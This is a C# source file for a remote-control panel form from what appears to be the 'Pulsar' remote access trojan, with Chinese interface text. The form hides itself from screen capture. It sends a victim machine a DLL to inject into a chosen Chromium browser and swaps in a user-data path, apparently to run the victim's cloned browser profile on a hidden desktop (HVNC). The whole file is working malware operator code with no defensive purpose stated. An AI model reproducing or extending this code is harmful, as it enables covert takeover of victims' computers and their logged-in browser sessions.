using Pulsar.Common.Messages.Monitoring.HVNC;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Networking;
using System;
using System.IO;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmHVNCPopUp : Form
    {
        private readonly Client _client;
        private readonly byte[] _dllBytes;

        public FrmHVNCPopUp(Client client, byte[] dllBytes)
        {
            _client = client;
            _dllBytes = dllBytes;

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "可执行文件 (*.exe)|*.exe|所有文件 (*.*)|*.*";
                openFileDialog.Title = "选择浏览器可执行文件";
                openFileDialog.CheckFileExists = true;

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    txtBrowserPath.Text = openFileDialog.FileName;
                }
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtBrowserPath.Text))
            {
                MessageBox.Show("请指定浏览器可执行文件路径。", "验证错误", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (string.IsNullOrWhiteSpace(txtSearchPattern.Text))
            {
                MessageBox.Show("请指定搜索模式。", "验证错误", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (string.IsNullOrWhiteSpace(txtReplacementPath.Text))
            {
                MessageBox.Show("请指定替换路径。", "验证错误", 
                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            _client.Send(new StartHVNCProcess
            {
                Path = "GenericChromium",
                DontCloneProfile = false,
                DllBytes = _dllBytes,
                CustomBrowserPath = txtBrowserPath.Text.Trim(),
                CustomSearchPattern = txtSearchPattern.Text.Trim(),
                CustomReplacementPath = txtReplacementPath.Text.Trim()
            });

            MessageBox.Show(
                $"通用 Chromium 浏览器注入已启动。\n\n" +
                $"浏览器：{Path.GetFileName(txtBrowserPath.Text)}\n" +
                $"搜索：{txtSearchPattern.Text}\n" +
                $"替换：{txtReplacementPath.Text}",
                "浏览器已启动",
                MessageBoxButtons.OK,
                MessageBoxIcon.Information
            );

            this.Close();
        }

        private void btnCancel_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void FrmHVNCPopUp_Load(object sender, EventArgs e)
        {
            toolTip1.SetToolTip(txtBrowserPath, "浏览器可执行文件完整路径（例如 C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe）");
            toolTip1.SetToolTip(txtSearchPattern, "在浏览器路径中搜索的字符串（例如 Local\\Vivaldi\\User Data）");
            toolTip1.SetToolTip(txtReplacementPath, "用于替换搜索模式的字符串（例如 Local\\Vivaldi\\KDOT）");
        }
    }
}
